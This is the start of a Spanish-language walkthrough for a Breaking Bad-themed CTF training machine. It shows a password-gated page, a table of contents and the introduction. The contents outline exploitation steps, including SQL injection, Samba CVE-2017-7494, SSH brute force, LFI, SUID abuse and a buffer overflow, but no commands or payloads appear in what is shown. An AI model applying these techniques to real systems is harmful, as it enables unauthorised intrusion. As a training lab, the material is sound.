<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
<head>
  <meta charset="utf-8" />
  <meta name="generator" content="pandoc" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
  <title>walkthrough</title>
  <style>
    code{white-space: pre-wrap;}
    span.smallcaps{font-variant: small-caps;}
    div.columns{display: flex; gap: min(4vw, 1.5em);}
    div.column{flex: auto; overflow-x: auto;}
    div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
    /* The extra [class] is a hack that increases specificity enough to
       override a similar rule in reveal.js */
    ul.task-list[class]{list-style: none;}
    ul.task-list li input[type="checkbox"] {
      font-size: inherit;
      width: 0.8em;
      margin: 0 0.8em 0.2em -1.6em;
      vertical-align: middle;
    }
    .display.math{display: block; text-align: center; margin: 0.5rem auto;}
  </style>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>

<body>

<!-- Formulario de contraseÃ±a -->
<div id="login">
  <h2>Introduce la contraseÃ±a para acceder</h2>
  <input type="password" id="clave" placeholder="ContraseÃ±a">
  <button onclick="verificar()">Entrar</button>
</div>

<!-- Contenido protegido -->
<div id="contenido" style="display:none;">


<p><img src="cookbook/media/image1.png"
style="width:4.30208in;height:4.30208in" /></p>
<p>Los Pollos Hermanos â€” Breaking Server</p>
<p><em><strong>Una mÃ¡quina CTF que te cocinarÃ¡ el cerebro (pero en buen
plan)</strong></em></p>
<p><strong><br />
</strong></p>
<h1 class="TOC-Heading" id="contenido">Contenido</h1>
<p><a href="#presentaciÃ³n"><strong>ğŸ” PresentaciÃ³n:</strong>
<span>10</span></a></p>
<p><a href="#instrucciones"><strong>ğŸ§ª Instrucciones</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189779"><strong>ğŸ® Â¿De quÃ© va el juego?</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189780"><strong>ğŸ Las Moscas (10 retos)</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189781"><strong>ğŸš© Las Banderas (15 retos)</strong>
<span>12</span></a></p>
<p><a href="#_Toc207189782"><strong>âš ï¸ Reglas del juego</strong>
<span>13</span></a></p>
<p><a href="#_Toc207189783"><strong>ğŸ§© Pistas y secretos del
servidor</strong> <span>13</span></a></p>
<p><a href="#_Toc207189784"><strong>ğŸ¯ Objetivo final</strong>
<span>13</span></a></p>
<p><a
href="#guÃ­a-de-orden-de-resoluciÃ³n-ctf-los-pollos-hermanos-braking-server"><strong>ğŸ•µï¸â€â™‚ï¸
GuÃ­a de Orden de ResoluciÃ³n CTF: Los Pollos Hermanos Braking
Server</strong> <span>14</span></a></p>
<p><a href="#_Toc207189786"><strong>ğŸ” DescripciÃ³n General</strong>
<span>14</span></a></p>
<p><a href="#_Toc207189787"><strong>ğŸ Parte 1: Las Moscas (CriptografÃ­a
- SteganografÃ­a - Forense - WEB - OSINT - Red - Misc)</strong>
<span>14</span></a></p>
<p><a href="#_Toc207189788"><strong>âš™ï¸ Parte 2: Las Banderas (Sistemas,
Red, Forense)</strong> <span>15</span></a></p>
<p><a href="#_Toc207189789"><strong>ğŸ§  Recomendaciones para los
Jugadores</strong> <span>15</span></a></p>
<p><a href="#_Toc207189790"><strong>ğŸ“ Observaciones del Autor</strong>
<span>15</span></a></p>
<p><a
href="#introducciÃ³n-al-walkthrough-mÃ¡quina-ctf-los-pollos-hermanos-breaking-server"><strong>ğŸ§¬
IntroducciÃ³n al Walkthrough: MÃ¡quina CTF â€œLos Pollos Hermanos Breaking
Serverâ€</strong> <span>16</span></a></p>
<p><a href="#_Toc207189792"><strong>ğŸ—‚ï¸ CategorÃ­as de retos
incluidas</strong> <span>16</span></a></p>
<p><a href="#_Toc207189793"><strong>âš™ï¸ Modalidades de
interacciÃ³n</strong> <span>16</span></a></p>
<p><a href="#_Toc207189794"><strong>ğŸ’¥ Objetivo formativo</strong>
<span>17</span></a></p>
<p><a href="#personajes"><strong>ğŸ” Personajes</strong>
<span>18</span></a></p>
<p><a href="#fase-0-reconocimiento-y-recopilaciÃ³n-inicial"><strong>ğŸ§­
Fase 0 â€“ Reconocimiento y RecopilaciÃ³n Inicial</strong>
<span>20</span></a></p>
<p><a href="#_Toc207189797"><strong>ğŸ¯ Objetivo:</strong>
<span>20</span></a></p>
<p><a href="#_Toc207189798"><strong>ğŸ” Paso 1 â€“ Escaneo detallado con
Nmap sobre los puertos encontrados</strong> <span>23</span></a></p>
<p><a href="#_Toc207189799"><strong>ğŸ“‚ Paso 2 â€“ EnumeraciÃ³n por
servicio</strong> <span>25</span></a></p>
<p><a href="#_Toc207189800"><strong>Consejos:</strong>
<span>33</span></a></p>
<p><a href="#resoluciÃ³n-de-moscas"><strong>ResoluciÃ³n de Moscas</strong>
<span>41</span></a></p>
<p><a href="#mosca-1-verificaciÃ³n-web-inicial"><strong>ğŸ Mosca 1 â€“
VerificaciÃ³n Web Inicial</strong> <span>42</span></a></p>
<p><a href="#_Toc207189803"><strong>ğŸ§  DescripciÃ³n del reto</strong>
<span>42</span></a></p>
<p><a href="#_Toc207189804"><strong>ğŸ§° Herramientas necesarias</strong>
<span>42</span></a></p>
<p><a href="#_Toc207189805"><strong>ğŸ¾ Paso a paso de
resoluciÃ³n</strong> <span>42</span></a></p>
<p><a href="#_Toc207189806"><strong>ğŸ›¡ï¸ Notas tÃ©cnicas</strong>
<span>46</span></a></p>
<p><a href="#_Toc207189807"><strong>ğŸ Resultado final</strong>
<span>47</span></a></p>
<p><a href="#mosca-2-esteganografÃ­a-en-metadatos"><strong>ğŸ Mosca 2 â€“
EsteganografÃ­a en Metadatos</strong> <span>48</span></a></p>
<p><a href="#_Toc207189809"><strong>ğŸ› ï¸ Herramientas necesarias</strong>
<span>48</span></a></p>
<p><a href="#_Toc207189810"><strong>ğŸ“ Fase 1 â€“ Descarga y
reconocimiento del archivo</strong> <span>48</span></a></p>
<p><a href="#_Toc207189811"><strong>ğŸ” Fase 2 â€“ Descifrando
Brainfuck</strong> <span>51</span></a></p>
<p><a href="#_Toc207189812"><strong>ğŸ“Š Fase 3 â€“ AnÃ¡lisis de
metadatos</strong> <span>52</span></a></p>
<p><a href="#_Toc207189813"><strong>âœ… Fase Final â€“
VerificaciÃ³n</strong> <span>53</span></a></p>
<p><a href="#_Toc207189814"><strong>ğŸ Resultado final</strong>
<span>53</span></a></p>
<p><a href="#mosca-3-cÃ³digo-qr"><strong>ğŸ Mosca 3 â€“ CÃ³digo Qr</strong>
<span>54</span></a></p>
<p><a href="#_Toc207189816"><strong>ğŸ› ï¸ Herramientas necesarias</strong>
<span>54</span></a></p>
<p><a href="#_Toc207189817"><strong>ğŸ“ Fase 1 â€“ LocalizaciÃ³n de la
pista</strong> <span>54</span></a></p>
<p><a href="#_Toc207189818"><strong>ğŸ” Fase 2 â€“ Leer cÃ³digo Qr</strong>
<span>54</span></a></p>
<p><a href="#_Toc207189819"><strong>ğŸ“¤ Fase 3 â€“ Analizar cÃ³digo
Qr</strong> <span>55</span></a></p>
<p><a href="#_Toc207189820"><strong>âœ… Fase Final â€“ VerificaciÃ³n
Web</strong> <span>55</span></a></p>
<p><a href="#_Toc207189821"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>56</span></a></p>
<p><a href="#_Toc207189822"><strong>ğŸ Resultado final</strong>
<span>56</span></a></p>
<p><a
href="#mosca-4-simulaciÃ³n-de-inyecciÃ³n-sql-en-formulario-web"><strong>ğŸ
Mosca 4 â€“ SimulaciÃ³n de InyecciÃ³n SQL en Formulario Web</strong>
<span>57</span></a></p>
<p><a href="#_Toc207189824"><strong>ğŸ§° Herramientas necesarias</strong>
<span>57</span></a></p>
<p><a href="#_Toc207189825"><strong>ğŸ“ Descifrando la pista</strong>
<span>57</span></a></p>
<p><a href="#_Toc207189826"><strong>ğŸŒ Acceso inicial</strong>
<span>60</span></a></p>
<p><a href="#_Toc207189827"><strong>ğŸ” Comportamiento del
formulario</strong> <span>61</span></a></p>
<p><a href="#_Toc207189828"><strong>ğŸ” AnÃ¡lisis de
vulnerabilidad</strong> <span>63</span></a></p>
<p><a href="#_Toc207189829"><strong>ğŸ§ª EjecuciÃ³n de la
inyecciÃ³n</strong> <span>63</span></a></p>
<p><a href="#_Toc207189830"><strong>âœ… Resultado esperado</strong>
<span>64</span></a></p>
<p><a href="#_Toc207189831"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>64</span></a></p>
<p><a href="#_Toc207189832"><strong>ğŸ Resultado final</strong>
<span>65</span></a></p>
<p><a
href="#mosca-5-crackeo-de-contraseÃ±a-de-archivo-protegido-.rar"><strong>ğŸ
Mosca 5 â€“ Crackeo de ContraseÃ±a de Archivo Protegido (.rar)</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189834"><strong>ğŸ§° Herramientas necesarias</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189835"><strong>ğŸ“ Contenido inicial</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189836"><strong>ğŸ§  Enunciado oculto</strong>
<span>66</span></a></p>
<p><a href="#_Toc207189837"><strong>ğŸ§ª Procedimiento paso a
paso</strong> <span>67</span></a></p>
<p><a href="#_Toc207189838"><strong>ğŸ§© Resultado</strong>
<span>68</span></a></p>
<p><a href="#_Toc207189839"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>69</span></a></p>
<p><a href="#mosca-6-descompresiÃ³n-braille-oculto-en-imagen"><strong>ğŸ
Mosca 6 â€“ DescompresiÃ³n + Braille oculto en imagen</strong>
<span>70</span></a></p>
<p><a href="#_Toc207189841"><strong>ğŸ“ Contenido de la carpeta</strong>
<span>70</span></a></p>
<p><a href="#_Toc207189842"><strong>ğŸ” AnÃ¡lisis de la pista</strong>
<span>70</span></a></p>
<p><a href="#_Toc207189843"><strong>ğŸ§ª Paso a paso tÃ©cnico</strong>
<span>71</span></a></p>
<p><a href="#_Toc207189844"><strong>ğŸ Resultado final</strong>
<span>73</span></a></p>
<p><a href="#_Toc207189845"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>73</span></a></p>
<p><a href="#mosca-7-md5-de-imagen-jpeg"><strong>ğŸ Mosca 7 â€“ MD5 de
Imagen JPEG</strong> <span>74</span></a></p>
<p><a href="#_Toc207189847"><strong>ğŸ§° Herramientas necesarias</strong>
<span>74</span></a></p>
<p><a href="#_Toc207189848"><strong>ğŸ“œ Pista inicial</strong>
<span>74</span></a></p>
<p><a href="#_Toc207189849"><strong>ğŸ§ª Procedimiento tÃ©cnico</strong>
<span>77</span></a></p>
<p><a href="#_Toc207189850"><strong>ğŸ Resultado final</strong>
<span>78</span></a></p>
<p><a href="#_Toc207189851"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>78</span></a></p>
<p><a href="#mosca-8-investigaciÃ³n-de-persona-desaparecida"><strong>ğŸ
Mosca 8 â€“ InvestigaciÃ³n de Persona Desaparecida</strong>
<span>79</span></a></p>
<p><a href="#_Toc207189853"><strong>ğŸ§° Herramientas necesarias</strong>
<span>79</span></a></p>
<p><a href="#_Toc207189854"><strong>ğŸ§ª Procedimiento tÃ©cnico</strong>
<span>79</span></a></p>
<p><a href="#_Toc207189855"><strong>ğŸ Resultado final</strong>
<span>87</span></a></p>
<p><a href="#_Toc207189856"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>87</span></a></p>
<p><a href="#mosca-9-reconocimiento-de-tonos-dtmf-en-audio"><strong>ğŸ
Mosca 9 â€“ Reconocimiento de Tonos DTMF en Audio</strong>
<span>88</span></a></p>
<p><a href="#_Toc207189858"><strong>ğŸ§° Herramientas necesarias</strong>
<span>88</span></a></p>
<p><a href="#_Toc207189859"><strong>ğŸ“œ Pista inicial</strong>
<span>88</span></a></p>
<p><a href="#_Toc207189860"><strong>ğŸ§ª Procedimiento tÃ©cnico</strong>
<span>90</span></a></p>
<p><a href="#_Toc207189861"><strong>ğŸ Resultado final</strong>
<span>92</span></a></p>
<p><a href="#_Toc207189862"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>92</span></a></p>
<p><a
href="#mosca-10-reconstrucciÃ³n-de-jpeg-desde-trÃ¡fico-http"><strong>ğŸ
Mosca 10 â€“ ReconstrucciÃ³n de JPEG desde trÃ¡fico HTTP</strong>
<span>93</span></a></p>
<p><a href="#_Toc207189864"><strong>ğŸ§° Herramientas necesarias</strong>
<span>93</span></a></p>
<p><a href="#_Toc207189865"><strong>ğŸ“œ Pista inicial</strong>
<span>93</span></a></p>
<p><a href="#_Toc207189866"><strong>ğŸ§ª Procedimiento tÃ©cnico</strong>
<span>97</span></a></p>
<p><a href="#_Toc207189867"><strong>ğŸ Resultado final</strong>
<span>99</span></a></p>
<p><a href="#_Toc207189868"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>99</span></a></p>
<p><a href="#resoluciÃ³n-de-banderas"><strong>ResoluciÃ³n de
Banderas</strong> <span>100</span></a></p>
<p><a
href="#bandera-1-escalada-de-privilegios-mediante-configuraciÃ³n-vulnerable-en-etcsudoers"><strong>ğŸ
Bandera 1 â€“ Escalada de Privilegios mediante configuraciÃ³n vulnerable en
/etc/sudoers</strong> <span>101</span></a></p>
<p><a href="#_Toc207189871"><strong>ğŸ” Objetivo del reto</strong>
<span>101</span></a></p>
<p><a href="#_Toc207189872"><strong>âš™ï¸ PreparaciÃ³n del entorno
realizada</strong> <span>101</span></a></p>
<p><a href="#_Toc207189873"><strong>ğŸ“ Bandera escondida</strong>
<span>102</span></a></p>
<p><a href="#_Toc207189874"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>103</span></a></p>
<p><a href="#_Toc207189875"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>105</span></a></p>
<p><a href="#_Toc207189876"><strong>ğŸ Resultado final</strong>
<span>105</span></a></p>
<p><a
href="#bandera-2-acceso-anÃ³nimo-a-servidor-ftp-con-archivos-ocultos"><strong>ğŸ
Bandera 2 â€“ Acceso AnÃ³nimo a Servidor FTP con Archivos Ocultos</strong>
<span>106</span></a></p>
<p><a href="#_Toc207189878"><strong>ğŸ” Objetivo del reto</strong>
<span>106</span></a></p>
<p><a href="#_Toc207189879"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>106</span></a></p>
<p><a href="#_Toc207189880"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>107</span></a></p>
<p><a href="#_Toc207189881"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>109</span></a></p>
<p><a href="#_Toc207189882"><strong>ğŸ Resultado final</strong>
<span>109</span></a></p>
<p><a
href="#bandera-3-binario-suid-vulnerable-a-comandos-arbitrarios"><strong>ğŸ
Bandera 3 â€“ Binario SUID Vulnerable a Comandos Arbitrarios</strong>
<span>110</span></a></p>
<p><a href="#_Toc207189884"><strong>ğŸ” Objetivo del reto</strong>
<span>110</span></a></p>
<p><a href="#_Toc207189885"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>110</span></a></p>
<p><a href="#_Toc207189886"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>114</span></a></p>
<p><a href="#_Toc207189887"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>117</span></a></p>
<p><a href="#_Toc207189888"><strong>ğŸ“Œ Tip adicional</strong>
<span>117</span></a></p>
<p><a href="#_Toc207189889"><strong>ğŸ Resultado final</strong>
<span>117</span></a></p>
<p><a href="#bandera-4-forense-de-archivos-sin-extensiÃ³n"><strong>ğŸ
Bandera 4 â€“ Forense de Archivos Sin ExtensiÃ³n</strong>
<span>118</span></a></p>
<p><a href="#_Toc207189891"><strong>ğŸ¯ Objetivo del reto</strong>
<span>118</span></a></p>
<p><a href="#_Toc207189892"><strong>ğŸ“¦ Contenido de la carpeta
Lavanderia</strong> <span>118</span></a></p>
<p><a href="#_Toc207189893"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>120</span></a></p>
<p><a href="#_Toc207189894"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>124</span></a></p>
<p><a href="#_Toc207189895"><strong>ğŸ§° Herramientas clave
recomendadas</strong> <span>124</span></a></p>
<p><a href="#_Toc207189896"><strong>ğŸ Resultado final</strong>
<span>124</span></a></p>
<p><a href="#bandera-5-dns-malicioso-en-trÃ¡fico-.pcap"><strong>ğŸ
Bandera 5 â€“ DNS Malicioso en TrÃ¡fico .pcap</strong>
<span>125</span></a></p>
<p><a href="#_Toc207189898"><strong>ğŸ¯ Objetivo del reto</strong>
<span>125</span></a></p>
<p><a href="#_Toc207189899"><strong>ğŸ”§ Entorno tÃ©cnico simulado</strong>
<span>125</span></a></p>
<p><a href="#_Toc207189900"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>125</span></a></p>
<p><a href="#_Toc207189901"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>128</span></a></p>
<p><a href="#_Toc207189902"><strong>ğŸ Resultado final</strong>
<span>128</span></a></p>
<p><a href="#bandera-6-explotaciÃ³n-de-samba-cve-2017-7494"><strong>ğŸ
Bandera 6 â€“ ExplotaciÃ³n de Samba (CVE-2017-7494)</strong>
<span>129</span></a></p>
<p><a href="#_Toc207189904"><strong>ğŸ¯ Objetivo del reto</strong>
<span>129</span></a></p>
<p><a href="#_Toc207189905"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>129</span></a></p>
<p><a href="#_Toc207189906"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>134</span></a></p>
<p><a href="#_Toc207189907"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>136</span></a></p>
<p><a href="#_Toc207189908"><strong>ğŸ Resultado final</strong>
<span>136</span></a></p>
<p><a
href="#bandera-7-fuerza-bruta-sobre-credenciales-ssh-dÃ©biles"><strong>ğŸ
Bandera 7 â€“ Fuerza Bruta sobre Credenciales SSH DÃ©biles</strong>
<span>137</span></a></p>
<p><a href="#_Toc207189910"><strong>ğŸ¯ Objetivo del reto</strong>
<span>137</span></a></p>
<p><a href="#_Toc207189911"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>137</span></a></p>
<p><a href="#_Toc207189912"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>139</span></a></p>
<p><a href="#_Toc207189913"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>143</span></a></p>
<p><a href="#_Toc207189914"><strong>ğŸ Resultado final</strong>
<span>143</span></a></p>
<p><a
href="#bandera-8-certificado-tls-con-bandera-oculta-en-commonname"><strong>ğŸ
Bandera 8 â€“ Certificado TLS con Bandera Oculta en CommonName</strong>
<span>144</span></a></p>
<p><a href="#_Toc207189916"><strong>ğŸ¯ Objetivo del reto</strong>
<span>144</span></a></p>
<p><a href="#_Toc207189917"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>144</span></a></p>
<p><a href="#_Toc207189918"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>144</span></a></p>
<p><a href="#_Toc207189919"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>147</span></a></p>
<p><a href="#_Toc207189920"><strong>ğŸ Resultado final</strong>
<span>147</span></a></p>
<p><a
href="#bandera-9-servicio-netcat-escuchando-en-puerto-oculto"><strong>ğŸ
Bandera 9 â€“ Servicio Netcat Escuchando en Puerto Oculto</strong>
<span>148</span></a></p>
<p><a href="#_Toc207189922"><strong>ğŸ¯ Objetivo del reto</strong>
<span>148</span></a></p>
<p><a href="#_Toc207189923"><strong>âš™ï¸ Entorno tÃ©cnico
configurado</strong> <span>148</span></a></p>
<p><a href="#_Toc207189924"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>151</span></a></p>
<p><a href="#_Toc207189925"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>152</span></a></p>
<p><a href="#_Toc207189926"><strong>ğŸ Resultado final</strong>
<span>152</span></a></p>
<p><a href="#bandera-10-vulnerabilidad-lfi-en-aplicaciÃ³n-php"><strong>ğŸ
Bandera 10 â€“ Vulnerabilidad LFI en AplicaciÃ³n PHP</strong>
<span>153</span></a></p>
<p><a href="#_Toc207189928"><strong>ğŸ¯ Objetivo del reto</strong>
<span>153</span></a></p>
<p><a href="#_Toc207189929"><strong>âš™ï¸ Entorno tÃ©cnico
configurado</strong> <span>153</span></a></p>
<p><a href="#_Toc207189930"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>154</span></a></p>
<p><a href="#_Toc207189931"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>156</span></a></p>
<p><a href="#_Toc207189932"><strong>ğŸ Resultado final</strong>
<span>156</span></a></p>
<p><a
href="#bandera-11-forense-de-pdf-con-cÃ³digos-de-ubicaciÃ³n"><strong>ğŸ
Bandera 11 â€“ Forense de PDF con CÃ³digos de UbicaciÃ³n</strong>
<span>157</span></a></p>
<p><a href="#_Toc207189934"><strong>ğŸ¯ Objetivo del reto</strong>
<span>157</span></a></p>
<p><a href="#_Toc207189935"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>160</span></a></p>
<p><a href="#_Toc207189936"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>163</span></a></p>
<p><a href="#_Toc207189937"><strong>ğŸ”§ Tip adicional</strong>
<span>163</span></a></p>
<p><a href="#_Toc207189938"><strong>ğŸ Resultado final</strong>
<span>163</span></a></p>
<p><a
href="#bandera-12-linux-fundamentals-warm-up-breaking-the-txt"><strong>ğŸ
Bandera 12 â€“ Linux Fundamentals / Warm-up: Breaking the TXT</strong>
<span>164</span></a></p>
<p><a href="#_Toc207189940"><strong>ğŸ¯ Objetivo del reto</strong>
<span>164</span></a></p>
<p><a href="#_Toc207189941"><strong>ğŸ“œ DinÃ¡mica breve</strong>
<span>165</span></a></p>
<p><a href="#_Toc207189942"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>165</span></a></p>
<p><a href="#_Toc207189943"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>167</span></a></p>
<p><a href="#_Toc207189944"><strong>ğŸ Resultado final</strong>
<span>167</span></a></p>
<p><a
href="#bandera-13-anÃ¡lisis-forense-de-registro-auth.log"><strong>ğŸ
Bandera 13 â€“ AnÃ¡lisis Forense de Registro auth.log</strong>
<span>168</span></a></p>
<p><a href="#_Toc207189946"><strong>ğŸ¯ Objetivo del reto</strong>
<span>168</span></a></p>
<p><a href="#_Toc207189947"><strong>ğŸ› ï¸ Entorno tÃ©cnico
configurado</strong> <span>168</span></a></p>
<p><a href="#_Toc207189948"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>169</span></a></p>
<p><a href="#_Toc207189949"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>172</span></a></p>
<p><a href="#_Toc207189950"><strong>ğŸ”§ Recomendaciones para jugadores
avanzados</strong> <span>172</span></a></p>
<p><a href="#_Toc207189951"><strong>ğŸ Resultado final</strong>
<span>173</span></a></p>
<p><a
href="#bandera-14-anÃ¡lisis-forense-de-volcado-de-memoria-ram"><strong>ğŸ
Bandera 14 â€“ AnÃ¡lisis Forense de Volcado de Memoria RAM</strong>
<span>174</span></a></p>
<p><a href="#_Toc207189953"><strong>ğŸ¯ Objetivo del reto</strong>
<span>174</span></a></p>
<p><a href="#_Toc207189954"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>175</span></a></p>
<p><a href="#_Toc207189955"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>176</span></a></p>
<p><a href="#_Toc207189956"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>178</span></a></p>
<p><a href="#_Toc207189957"><strong>ğŸ Resultado final</strong>
<span>178</span></a></p>
<p><a
href="#bandera-15-buffer-overflow-para-ejecuciÃ³n-de-funciÃ³n-secreta"><strong>ğŸ
Bandera 15 â€“ Buffer Overflow para EjecuciÃ³n de FunciÃ³n Secreta</strong>
<span>179</span></a></p>
<p><a href="#_Toc207189959"><strong>ğŸ¯ Objetivo del reto</strong>
<span>179</span></a></p>
<p><a href="#_Toc207189960"><strong>ğŸ§  Â¿QuÃ© es un Buffer
Overflow?</strong> <span>179</span></a></p>
<p><a href="#_Toc207189961"><strong>âš™ï¸ Entorno tÃ©cnico
preparado</strong> <span>182</span></a></p>
<p><a href="#_Toc207189962"><strong>ğŸ§ª Pasos para capturar la
bandera</strong> <span>182</span></a></p>
<p><a href="#_Toc207189963"><strong>ğŸ§  Razonamiento tÃ©cnico</strong>
<span>187</span></a></p>
<p><a href="#_Toc207189964"><strong>ğŸ Resultado final</strong>
<span>187</span></a></p>
<p><a href="#bonus-final-osint"><strong>ğŸ Bonus Final â€“ OSINT</strong>
<span>188</span></a></p>
<p><a href="#herramientas-utilizadas"><strong>ğŸ§° Herramientas
Utilizadas</strong> <span>196</span></a></p>
<p><a href="#herramientas-online-utilizadas"><strong>ğŸ§° Herramientas
Online Utilizadas</strong> <span>199</span></a></p>
<p><a href="#resumen-final"><strong>ğŸ Resumen Final</strong>
<span>201</span></a></p>
<p><a href="#_Toc207189969"><strong>Aprendizajes clave</strong>
<span>201</span></a></p>
<p><a href="#_Toc207189970"><strong>Parte 1: Moscas (criptografÃ­a,
stego, forense, web, OSINT, red)</strong> <span>201</span></a></p>
<p><a href="#_Toc207189971"><strong>Parte 2: Banderas (sistemas, red,
forense y privilegios)</strong> <span>202</span></a></p>
<p><a href="#_Toc207189972"><strong>Buenas prÃ¡cticas y mentalidad
tÃ©cnica</strong> <span>203</span></a></p>
<p><a href="#_Toc207189973"><strong>QuÃ© te llevas aplicado al â€œmundo
realâ€</strong> <span>204</span></a></p>
<p><a href="#_Toc207189974"><strong>Siguientes pasos para
consolidar</strong> <span>204</span></a></p>
<p><strong><br />
</strong></p>
<h1 id="presentaciÃ³n"><strong>ğŸ” PresentaciÃ³n:</strong></h1>
<p><strong>ğŸ¬ IntroducciÃ³n:</strong></p>
<p>SumÃ©rgete en una mÃ¡quina CTF ambientada en el universo de
<em>Breaking Bad</em>, donde el anÃ¡lisis forense, la criptografÃ­a y la
explotaciÃ³n web se fusionan en una experiencia electrizante. En
<strong>Los Pollos Hermanos Breaking Server</strong>, no basta con
pensar como un hacker. Tienes que razonar como Heisenberg: estratÃ©gico,
preciso y un poco impredecible.</p>
<p><strong>ğŸ§  Lo que aprenderÃ¡s:</strong></p>
<p>Este reto estÃ¡ construido para enseÃ±arte tÃ©cnicas fundamentales y
avanzadas del pentesting, incluyendo:</p>
<ul>
<li><p><strong>CriptografÃ­a aplicada:</strong> anÃ¡lisis de hashes, QR,
mensajes ocultos.</p></li>
<li><p><strong>EsteganografÃ­a moderna:</strong> espectrogramas, imÃ¡genes
tÃ©rmicas, audio codificado.</p></li>
<li><p><strong>AnÃ¡lisis Forense digital:</strong> estructura temporal
(ctime), memoria, logs alterados.</p></li>
<li><p><strong>ExplotaciÃ³n Web:</strong> SQL Injection, Local File
Inclusion (LFI), configuraciones inseguras.</p></li>
<li><p><strong>Redes:</strong> trÃ¡fico .pcap con protocolos HTTP, DNS,
TLS, y servicios mal configurados como FTP anÃ³nimo.</p></li>
<li><p><strong>Escalada de privilegios y explotaciÃ³n de binarios
vulnerables.</strong></p></li>
<li><p><strong>OSINT realista:</strong> bÃºsqueda de informaciÃ³n oculta y
pistas digitales.</p></li>
<li><p><strong>Reconocimiento de sistemas:</strong> puertos, servicios,
y estructuras ocultas.</p></li>
</ul>
<p><strong>ğŸ“‚ CategorÃ­as de los retos:</strong></p>
<ul>
<li><p>ğŸ” CriptografÃ­a</p></li>
<li><p>ğŸ§¬ EsteganografÃ­a</p></li>
<li><p>ğŸ” Forense</p></li>
<li><p>ğŸ“¡ AnÃ¡lisis de red</p></li>
<li><p>ğŸ•¸ï¸ Web Exploitation</p></li>
<li><p>ğŸ§¨ Pwn &amp; Privilege Escalation</p></li>
<li><p>ğŸ§  OSINT</p></li>
<li><p>ğŸ•µï¸ Reconocimiento</p></li>
</ul>
<p>Cada categorÃ­a incluye varias tÃ©cnicas y herramientas ampliamente
utilizadas en auditorÃ­as reales: Wireshark, ExifTool, hashcat, steghide,
nmap, netcat, entre otros.</p>
<p><strong>ğŸ’¡ Â¿PorquÃ© jugar esta mÃ¡quina?</strong></p>
<p>Porque no solo resolverÃ¡s retos tÃ©cnicos, sino que descifrarÃ¡s una
narrativa envolvente ambientada en el universo de <em>Breaking Bad</em>.
Cada fase oculta pistas, secretos y vulnerabilidades que solo un
verdadero pentester sabrÃ¡ extraer. Es ideal para:</p>
<ul>
<li><p>Estudiantes que quieren aprender con prÃ¡ctica realista.</p></li>
<li><p>Profesionales que buscan afilar sus tÃ©cnicas.</p></li>
<li><p>Equipos que desean entrenar en simulaciones estilo Red
Team.</p></li>
<li><p>Cualquiera que quiera <em>cocinar su prÃ³xima bandera</em> como un
maestro del laboratorio.</p></li>
</ul>
<p><strong>ğŸ³ Frase del chef:</strong></p>
<p>En el Server de â€œLos Pollos Hermanosâ€ no solo sirven pollo...<br />
Sirven una experiencia digital inolvidable que te harÃ¡ explotar â€” y no
por la cocina, sino por el conocimiento.</p>
<p><strong><br />
</strong></p>
<h1 id="instrucciones"><strong>ğŸ§ª Instrucciones</strong></h1>
<p>Â¡Bienvenido/a al desafÃ­o definitivo de <strong>Los Pollos Hermanos:
Breaking Server</strong>! ğŸŒğŸ”ğŸ’£</p>
<p>PrepÃ¡rate para sumergirte en un mundo de <strong>criptas, secretos y
exploits</strong> inspirado en el universo de <em>Breaking Bad</em>.
Esta <strong>mÃ¡quina CTF</strong> ha sido diseÃ±ada con fines educativos,
pero tambiÃ©n con un objetivo muy claro: <strong>poner a prueba tu
ingenio, tu habilidad y tu paciencia</strong>.</p>
